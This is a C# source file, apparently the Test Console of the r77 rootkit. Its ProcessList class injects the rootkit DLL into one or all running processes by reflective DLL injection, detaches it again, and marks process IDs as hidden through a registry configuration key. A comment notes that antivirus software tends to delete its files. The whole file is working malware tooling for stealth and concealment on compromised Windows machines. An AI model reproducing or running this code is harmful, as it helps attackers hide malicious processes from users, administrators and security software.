using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using Global;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace TestConsole
{
	/// <summary>
	/// Interface to inject r77 to or detach r77 from running processes.
	/// </summary>
	public static class ProcessList
	{
		/// <summary>
		/// Injects the specified process with the r77 DLL using reflective DLL injection.
		/// <para>Helper32.exe or Helper64.exe is invoked to perform injection.</para>
		/// </summary>
		/// <param name="process">The process to inject.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Inject(ProcessView process)
		{
			string helperPath = GetFilePath(process.Is64Bit == true ? "Helper64.exe" : "Helper32.exe", out LogMessage helperPathLogMessage);
			if (helperPath == null)
			{
				yield return helperPathLogMessage;
				yield break;
			}

			string dllPath = GetFilePath(process.Is64Bit == true ? "r77-x64.dll" : "r77-x86.dll", out LogMessage dllPathLogMessage);
			if (dllPath == null)
			{
				yield return dllPathLogMessage;
				yield break;
			}

			if (!ProcessEx.IsRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is no longer running.")
				);
				yield break;
			}

			if (ProcessEx.Execute(helperPath, "-inject " + process.Id + " \"" + dllPath + "\"") == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Injected"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ").")
				);
			}
			else
			{
				string reason;
				if (process.Name.StartsWith(Config.HidePrefix)) reason = "The filename starts with '" + Config.HidePrefix + "'.";
				else if (process.IsR77Service) reason = "The process is the r77 service process.";
				else if (process.IsHelper) reason = "The process is a helper process.";
				else if (process.IntegrityLevel < ProcessIntegrityLevel.Medium) reason = "Sandboxes are not supported";
				else reason = Path.GetFileName(helperPath) + " returned an error code.";

				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Injection of"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") failed."),
					new LogDetailsItem(reason)
				);
			}
		}
		/// <summary>
		/// Detaches r77 from the specified process.
		/// <para>Helper32.exe or Helper64.exe is invoked to call the detach function pointer found in the r77 header.</para>
		/// </summary>
		/// <param name="process">The process to detach.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Detach(ProcessView process)
		{
			string helperPath = GetFilePath(process.Is64Bit == true ? "Helper64.exe" : "Helper32.exe", out LogMessage helperPathLogMessage);
			if (helperPath == null)
			{
				yield return helperPathLogMessage;
				yield break;
			}

			if (!ProcessEx.IsRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is no longer running.")
				);
				yield break;
			}

			if (ProcessEx.Execute(helperPath, "-detach " + process.Id) == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Detached from"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ").")
				);
			}
			else
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Detaching of"),
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") failed.")
				);
			}
		}
		/// <summary>
		/// Injects all processes with the r77 DLL using reflective DLL injection.
		/// <para>Both Helper32.exe and Helper64.exe are invoked using the "-inject -all" commandline.</para>
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> InjectAll()
		{
			int injectedCount = GetInjectedCount();

			string helper32Path = GetFilePath("Helper32.exe", out LogMessage helper32PathLogMessage);
			if (helper32Path == null)
			{
				yield return helper32PathLogMessage;
				yield break;
			}

			string helper64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				helper64Path = GetFilePath("Helper64.exe", out LogMessage helper64PathLogMessage);
				if (helper64Path == null)
				{
					yield return helper64PathLogMessage;
					yield break;
				}
			}

			string dll32Path = GetFilePath("r77-x86.dll", out LogMessage dll32PathLogMessage);
			if (dll32Path == null)
			{
				yield return dll32PathLogMessage;
				yield break;
			}

			string dll64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				dll64Path = GetFilePath("r77-x64.dll", out LogMessage dll64PathLogMessage);
				if (dll64Path == null)
				{
					yield return dll64PathLogMessage;
					yield break;
				}
			}

			if (ProcessEx.Execute(helper32Path, "-inject -all \"" + dll32Path + "\"") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(helper32Path)),
					new LogTextItem("returned an error code.")
				);
			}

			if (Environment.Is64BitOperatingSystem && ProcessEx.Execute(helper64Path, "-inject -all \"" + dll64Path + "\"") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(helper64Path)),
					new LogTextItem("returned an error code.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount == injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes were injected")
				);
			}
			else if (newInjectedCount > injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Injected " + (newInjectedCount - injectedCount) + " processes.")
				);
			}
		}
		/// <summary>
		/// Detaches r77 from all running processes.
		/// <para>Both Helper32.exe and Helper64.exe are invoked using the "-detach -all" commandline.</para>
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> DetachAll()
		{
			int injectedCount = GetInjectedCount();
			if (injectedCount == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes are injected.")
				);
				yield break;
			}

			string helper32Path = GetFilePath("Helper32.exe", out LogMessage helper32PathLogMessage);
			if (helper32Path == null)
			{
				yield return helper32PathLogMessage;
				yield break;
			}

			string helper64Path = null;
			if (Environment.Is64BitOperatingSystem)
			{
				helper64Path = GetFilePath("Helper64.exe", out LogMessage helper64PathLogMessage);
				if (helper64Path == null)
				{
					yield return helper64PathLogMessage;
					yield break;
				}
			}

			if (ProcessEx.Execute(helper32Path, "-detach -all") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(helper32Path)),
					new LogTextItem("returned an error code.")
				);
			}

			if (Environment.Is64BitOperatingSystem && ProcessEx.Execute(helper64Path, "-detach -all") != 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogFileItem(Path.GetFileName(helper64Path)),
					new LogTextItem("returned an error code.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount < injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Detached from " + (injectedCount - newInjectedCount) + " processes.")
				);
			}

			if (newInjectedCount > 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem(newInjectedCount + " processes could not be detached.")
				);
			}
		}
		/// <summary>
		/// Hides a process ID by entering the PID into the r77 configuration system.
		/// </summary>
		/// <param name="process">The process to hide by ID.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Hide(ProcessView process)
		{
			bool success = false;

			using (RegistryKey key = OpenConfigKey())
			{
				if (key != null)
				{
					WriteProcessId(key);
					success = true;
				}
				else
				{
					string helperPath = GetFilePath("Helper32.exe", out LogMessage helperPathLogMessage);
					if (helperPath == null)
					{
						yield return helperPathLogMessage;
						yield break;
					}

					if (CSharp.Try(() => ProcessEx.Execute(helperPath, "-config", true), 1) == 0)
					{
						yield return new LogMessage
						(
							LogMessageType.Information,
							new LogTextItem("Registry key"),
							new LogFileItem(@"HKEY_LOCAL_MACHINE\SOFTWARE\" + Config.HidePrefix + "config"),
							new LogTextItem("created.")
						);

						using (RegistryKey key2 = OpenConfigKey())
						{
							if (key2 != null)
							{
								WriteProcessId(key2);
								success = true;
							}
						}
					}
					else
					{
						yield return new LogMessage
						(
							LogMessageType.Error,
							new LogTextItem("Registry key"),
							new LogFileItem(@"HKEY_LOCAL_MACHINE\SOFTWARE\" + Config.HidePrefix + "config"),
							new LogTextItem("not found. If r77 is not installed, this key requires to be created using elevated privileges. After creation, the DACL is set to allow full access by any user.")
						);
						yield break;
					}
				}
			}

			if (success)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogFileItem(process.Name),
					new LogTextItem("(PID " + process.Id + ") is marked as hidden.")
				);

				if (process.Name.StartsWith(Config.HidePrefix))
				{
					yield return new LogMessage
					(
						LogMessageType.Warning,
						new LogFileItem(process.Name),
						new LogTextItem("(PID " + process.Id + ") is already hidden by prefix. Hiding the process by ID is unnecessary.")
					);
				}

				if (GetInjectedCount() == 0)
				{
					yield return new LogMessage
					(
						LogMessageType.Warning,
						new LogTextItem("r77 needs to be installed, or at least injected in a task manager for process hiding to have effect.")
					);
				}
			}

			RegistryKey OpenConfigKey()
			{
				return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(@"SOFTWARE\" + Config.HidePrefix + @"config", true);
			}
			void WriteProcessId(RegistryKey configKey)
			{
				using (RegistryKey pidKey = configKey.CreateSubKey("pid"))
				{
					pidKey.SetValue("TestConsole_HiddenPID_" + process.Id, process.Id, RegistryValueKind.DWord);
				}
			}
		}
		/// <summary>
		/// Removes a process ID from the r77 configuration system to make the process visible again.
		/// </summary>
		/// <param name="process">The process to unhide.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Unhide(ProcessView process)
		{
			using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(@"SOFTWARE\" + Config.HidePrefix + @"config\pid", true))
			{
				if (key != null)
				{
					string[] valueNames = key
						.GetValueNames()
						.Where(name => key.GetValueKind(name) == RegistryValueKind.DWord)
						.Where(name => (int)key.GetValue(name) == process.Id)
						.ToArray();

					if (valueNames.Any())
					{
						foreach (string valueName in valueNames)
						{
							key.DeleteValue(valueName);
						}

						yield return new LogMessage
						(
							LogMessageType.Information,
							new LogFileItem(process.Name),
							new LogTextItem("(PID " + process.Id + ") is marked as not hidden.")
						);
					}
				}
			}
		}

		private static int GetInjectedCount()
		{
			return ProcessView.GetProcesses().Count(process => process.IsInjected);
		}
		private static string GetFilePath(string filename, out LogMessage message)
		{
			// Gets the path to a file in the application directory.
			// If the file does not exist, return null and a log message.

			// This is a common issue when using the Test Console, because antivirus software may delete some files.
			// However, the installer is fileless and once executed, doesn't have issues with missing files.

			string path = Path.Combine(ApplicationBase.Path, filename);
			if (File.Exists(path))
			{
				message = null;
				return path;
			}
			else
			{
				message = new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("File"),
					new LogFileItem(Path.GetFileName(path)),
					new LogTextItem("not found."),
					new LogDetailsItem("It might have been removed by antivirus software.")
				);
				return null;
			}
		}
	}
}